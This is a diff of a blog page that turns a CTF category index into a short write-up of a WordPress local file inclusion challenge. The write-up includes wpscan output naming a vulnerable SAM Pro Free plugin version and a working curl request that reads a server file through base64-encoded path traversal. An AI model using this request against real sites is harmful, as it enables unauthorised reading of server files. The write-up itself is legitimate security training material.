@@ -11,7 +11,7 @@
 
   <title>
     
-      FIC Escape &middot; Rot26
+      What the LFI ? &middot; Rot26
     
   </title>
 
@@ -35,7 +35,7 @@
 </head>
 
 
-  <body class="category">
+  <body class="page">
 
     <div id="sidebar">
   <header>
@@ -247,7 +247,7 @@
 
   
     
-      <a class="category-link  active"
+      <a class="category-link "
           href="/category/FIC_Escape.html">FIC Escape</a>
     
   
@@ -465,20 +465,39 @@
 
     <main class="container">
       <div class="content">
-  
-  <h1 id="fic-escape">FIC Escape</h1>
-<ul>
-  <li><a href="/CTF/FIC_Escape/2018/crypto/just_crypt"><em>crypto</em> : just_crypt</a></li>
-  <li><a href="/CTF/FIC_Escape/2018/jail/pyjail1"><em>jail</em> : pyjail1</a></li>
-  <li><a href="/CTF/FIC_Escape/2018/web/nosql"><em>web</em> : nosql</a></li>
-</ul>
+  <h1 id="what-the-lfi-">What the LFI ?</h1>
 
+<p>So we got a website : http://54.201.224.15:14099/ and we need to get <code class="highlighter-rouge">/var/www/blah.php</code> file.
+Given the title, we know we need to find some LFI.</p>
 
+<h1 id="recon">Recon</h1>
 
-<ul class="posts-list">
-  
-  
-</ul>
+<p>This is a wordpress site, so just run wpscan, and after a few seconds :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Enumerating plugins from passive detection ...
+ | 1 plugin found:
+
+[+] Name: sam-pro-free - v1.8.2.51
+ |  Last updated: 2017-06-19T15:42:00.000Z
+ |  Location: http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/
+ |  Readme: http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/readme.txt
+[!] The version is out of date, the latest version is 2.4.1.92
+
+[!] Title: SAM Pro (Free Edition) &lt;= 1.9.6.67 - Local File Inclusion (LFI)
+    Reference: https://wpvulndb.com/vulnerabilities/8647
+    Reference: https://www.pluginvulnerabilities.com/2016/10/28/local-file-inclusion-lfi-vulnerability-in-sam-pro-free-edition/
+    Reference: https://plugins.trac.wordpress.org/changeset/1526624/sam-pro-free
+[i] Fixed in: 1.9.7.69
+
+</code></pre></div></div>
+
+<h1 id="exploit">Exploit</h1>
+
+<p>Just find the exploit from documentation, then base64 encode your path (<code class="highlighter-rouge">../../../../../../../var/www/blah.php</code>) and:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="s1">'http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&amp;wap=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9ibGFoLnBocA=='</span>
+flag<span class="o">{</span>dont_include_files_derived_from_user_input_kthx_bai<span class="o">}</span>
+</code></pre></div></div>
 
 </div>
 
